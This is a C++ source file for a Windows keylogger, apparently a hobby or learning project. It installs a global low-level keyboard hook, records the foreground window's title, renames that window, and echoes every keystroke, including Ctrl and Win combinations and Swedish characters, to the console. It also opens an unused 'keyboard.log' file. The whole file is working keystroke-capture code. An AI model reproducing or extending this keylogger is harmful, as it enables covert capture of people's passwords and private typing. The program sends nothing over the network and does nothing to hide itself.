#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <vector>
using namespace std;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParan);
HHOOK keyboardHook;
HWND prevWindow;
ofstream logfile;
char title[1024];
bool shift = false;
bool control = false;
bool windows = false;

int main()
{
	locale swedish("swedish");
	locale::global(swedish);
	cout << "Hooking the keyboard" << endl;
	logfile.open("keyboard.log");	
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
	cout << "Hook: " << keyboardHook << endl;
	if ((GetKeyState(VK_CAPITAL)) != 0) {
		shift = true;
		cout << "Caps Lock: on" << endl;
	}
	else {
		shift = false;
		cout << "Caps Lock: off" << endl;
	}
	MSG msg{ 0 };
	while (GetMessage(&msg, NULL, 0, 0) != 0) //returns 0 when WM_QUIT gets called				
	UnhookWindowsHookEx(keyboardHook);
	return 0;

}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	HWND fwindow = GetForegroundWindow();
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION) { // key has been pressed
		if (prevWindow != fwindow) { // prints the window name only if the user has began typing in a new window
			wchar_t wtitle[1024];
			mbstowcs(wtitle, title, strlen(title) + 1);
			LPWSTR old_title = wtitle;
			SetWindowText(prevWindow, old_title);

			GetWindowTextA(fwindow, title, 1024);
			cout << "Title: " << title << " -> " << "\"keyboard hooked application\"" << endl;
			SetWindowText(fwindow, L"keyboard hooked application"); //LPCWSTR needs to have L as prefix to assign a string to it
			prevWindow = fwindow;
		}

			
		int current_key = (int)(key->vkCode);
		switch (current_key) {
		case 8: //backspace
			cout << "\b \b";
			break;
		case 9:
			cout << "    ";
			break;
		case 13:
			cout << " [ENTER]\n";
			break;
		case 32: //space-bar
			cout << " ";
			break;
		case 20:
			shift = !shift;
			break;
		case 162: //ctrl
		case 163:
			control = true;
			break;
		case 91: //win-key
			windows = true;
			break;
		case 160: //shift
		case 161:
			shift = !shift;
			break;
		case 190:
			cout << ".";
			break;
		case 187:
			cout << "?";
			break;
		case 188:
			cout << ",";
			break;
		case 189:
			cout << "-";
			break;
		case 221:
			cout << "å";
			break;
		case 222:
			cout << "ä";
			break;
		case 192:
			cout << "ö";
			break;
		default:
			if (windows && (current_key >= 65 && current_key <= 90)) {
				cout << " WIN-[" << (char)tolower(current_key) << "] \n";
				break;
			}
			if (control && (current_key >= 65 && current_key <= 90)) { // if control is pressed and the other key is (A - Z)
				cout << " CTRL-[" << (char)tolower(current_key) << "] ";
				break;
			}
			if (shift == false && (current_key >= 65 && current_key <= 90)) { // (A - Z)
				cout << (char)(current_key + 32);
				break;
			}
			else if (shift == true && (current_key >= 65 && current_key <= 90)) { // (A - Z) shifted
				cout << (char)(current_key);
				break;
			}
			else if (shift == true && (current_key >= 48 && current_key <= 57)) { // shifted numbered
				if (current_key == 48) {
					cout << (char)(current_key + 13);
				}
				else {
					cout << (char)(current_key - 16);
				}
				
			}
			else if ((current_key >= 48 && current_key <= 57)){ // numbers
				cout << (char)(current_key);
				break;
			}
			else {
				cout << (int)current_key;
				break;
			}
			break;
		}
	}
	if (wParam == WM_KEYUP && nCode == HC_ACTION) {
		int current_key = (int)(key->vkCode);
		switch (current_key) {
		case 91:
			windows = false;
			break;
		case 160:
		case 161:
			shift = !shift;
			break;
		case 162:
		case 163:
			control = false;
			break;
		}
	}
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}